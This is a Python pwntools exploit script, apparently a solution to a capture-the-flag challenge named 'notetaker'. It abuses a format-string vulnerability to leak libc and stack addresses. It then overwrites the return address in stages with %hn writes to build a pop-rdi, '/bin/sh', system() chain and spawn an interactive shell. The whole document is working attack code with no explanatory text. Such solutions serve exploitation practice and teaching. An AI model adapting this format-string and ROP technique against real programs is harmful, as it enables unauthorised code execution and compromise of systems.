#!/usr/bin/env python3

from pwn import *


def read_t():
    io.sendlineafter(b"4. Exit", b"1")


def write_t(d):
    io.sendlineafter(b"4. Exit", b"2")
    io.sendlineafter(b"note", d)

def clear_t():
    io.sendlineafter(b"4. Exit", b"3")


io = process("./notetaker_patched")
# io = connect("notetaker.ctf.pascalctf.it", 9002)

write_t(b"%p-"*0x40)
read_t()
io.recvuntil(b"> ")
leak_libc = io.recvuntil(b"-")[:-1].decode()
libc_base = int(leak_libc, 16) - (0x7f30917c4b28 - 0x00007f3091400000)
for i in range(38):
    io.recvuntil(b"-")
leak_stack = io.recvuntil(b"-")[:-1].decode()
base_frame = int(leak_stack, 16) - (0x7ffd6fedd680 - 0x7ffd6fedd5a8)


pop_rdi = 0x0000000000400c03
syst = libc_base + (0x7fd31fa453a0 - 0x7fd31fa00000)
bins = libc_base + (0x7fd31fb8ce57 - 0x7fd31fa00000)


def decoupe(n):
    p1 = n%0x10000
    p2 = (n>>16)%0x10000
    p3 = (n>>32)%0x10000
    p4 = (n>>48)%0x10000
    return [p1, p2, p3, p4]


already_writted = 0

'''write pop_rdi'''
clear_t()

write_pop_rdi = b""
write_pop_rdi += b"%" + str(decoupe(pop_rdi)[0] - already_writted).encode() + b"x"
already_writted = decoupe(pop_rdi)[0]
write_pop_rdi += b"%24$hn"
write_pop_rdi += b"%" + str((decoupe(pop_rdi)[1] - already_writted + 0x10000) % 0x10000).encode() + b"x"
already_writted = decoupe(pop_rdi)[1]
write_pop_rdi += b"%25$hn"
write_pop_rdi += b"%" + str((decoupe(pop_rdi)[2] - already_writted + 0x10000) % 0x10000).encode() + b"x"
already_writted = decoupe(pop_rdi)[2]
write_pop_rdi += b"%26$hn"
already_writted = decoupe(pop_rdi)[3]
write_pop_rdi += b"%27$hn"
write_pop_rdi += b"a"*(0x80 - len(write_pop_rdi))
write_pop_rdi += p64(base_frame)
write_pop_rdi += p64(base_frame + 2)
write_pop_rdi += p64(base_frame + 4)
write_pop_rdi += p64(base_frame + 6)

write_t(write_pop_rdi)
read_t()

'''write binsh'''
clear_t()

write_bin_sh = b""
write_bin_sh += b"%" + str(decoupe(bins)[0] - already_writted).encode() + b"x"
already_writted = decoupe(bins)[0]
write_bin_sh += b"%24$hn"
write_bin_sh += b"%" + str((decoupe(bins)[1] - already_writted + 0x10000) % 0x10000).encode() + b"x"
already_writted = decoupe(bins)[1]
write_bin_sh += b"%25$hn"
write_bin_sh += b"%" + str((decoupe(bins)[2] - already_writted + 0x10000) % 0x10000).encode() + b"x"
already_writted = decoupe(bins)[2]
write_bin_sh += b"%26$hn"
write_bin_sh += b"%" + str((decoupe(bins)[3] - already_writted + 0x10000) % 0x10000).encode() + b"x"
already_writted = decoupe(bins)[3]
write_bin_sh += b"%27$hn"
write_bin_sh += b"a"*(0x80 - len(write_bin_sh))
write_bin_sh += p64(base_frame + 8)
write_bin_sh += p64(base_frame + 10)
write_bin_sh += p64(base_frame + 12)
write_bin_sh += p64(base_frame + 14)

write_t(write_bin_sh)
read_t()
'''write system'''
clear_t()

write_syst = b""
write_syst += b"%" + str(decoupe(syst)[0] - already_writted).encode() + b"x"
already_writted = decoupe(syst)[0]
write_syst += b"%24$hn"
write_syst += b"%" + str((decoupe(syst)[1] - already_writted + 0x10000) % 0x10000).encode() + b"x"
already_writted = decoupe(syst)[1]
write_syst += b"%25$hn"
write_syst += b"%" + str((decoupe(syst)[2] - already_writted + 0x10000) % 0x10000).encode() + b"x"
already_writted = decoupe(syst)[2]
write_syst += b"%26$hn"
write_syst += b"%" + str((decoupe(syst)[3] - already_writted + 0x10000) % 0x10000).encode() + b"x"
already_writted = decoupe(syst)[3]
write_syst += b"%27$hn"
write_syst += b"a"*(0x80 - len(write_syst))
write_syst += p64(base_frame + 16)
write_syst += p64(base_frame + 18)
write_syst += p64(base_frame + 20)
write_syst += p64(base_frame + 22)

write_t(write_syst)
read_t()

io.sendline(b"5")
io.interactive()